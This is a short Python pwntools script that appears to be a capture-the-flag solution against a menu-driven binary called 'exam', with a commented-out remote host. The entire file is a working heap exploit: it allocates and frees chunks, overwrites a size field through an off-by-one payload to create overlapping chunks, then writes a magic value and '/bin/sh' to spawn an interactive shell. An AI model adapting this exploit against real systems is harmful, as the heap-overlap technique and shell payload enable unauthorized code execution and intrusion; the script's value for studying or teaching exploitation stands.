from pwn import *
 
prompt = '> '
a, r, s, c, t, e = '1', '2', '3', '4', '5', '6'
 
def add(payload):
    p.sendlineafter(prompt, a)
    if len(payload) < 0x80:
        payload += '\n'
    p.sendafter(prompt, payload)
 
 
def remove(idx):
    p.sendlineafter(prompt, r)
    p.sendlineafter(prompt, str(idx))
    return p.recvlines(2)
 
 
def view(idx):
    p.sendlineafter(prompt, s)
    p.sendlineafter(prompt, str(idx))
    p.recvuntil(':\n')
    return p.recvline()
 
 
def create_crib():
    p.sendlineafter(prompt, c)
    p.recvuntil('Result:\n')
    return p.recvline()
 
 
def tear():
    p.sendlineafter(prompt, t)
 
 
def exam(idx):
    p.sendlineafter(prompt, e)
    p.sendlineafter(prompt, str(idx))
 
 
if __name__ == '__main__':
    #p = process('./exam', env={'LD_PRELOAD': './libc.so.6'})
    p = process('./exam')
    #else:
    #    p = remote('flatearth.fluxfingers.net', 1745)
    add('A'*0x60)
    create_crib()
    add('A'*0x60)
    add('A'*0x60)
    add('A'*0x60)
    remove(2)
    payload = ''.ljust(0x78, 'A') + p64(0x1e0) + '\x90'
    add(payload)
    remove(0)
    remove(3)
    add('A'*0x8)
    payload = fit({0x28: p64(0x434947414d535449)+'/bin/sh\x00'})
    add(payload)
    exam(1)
    p.interactive()


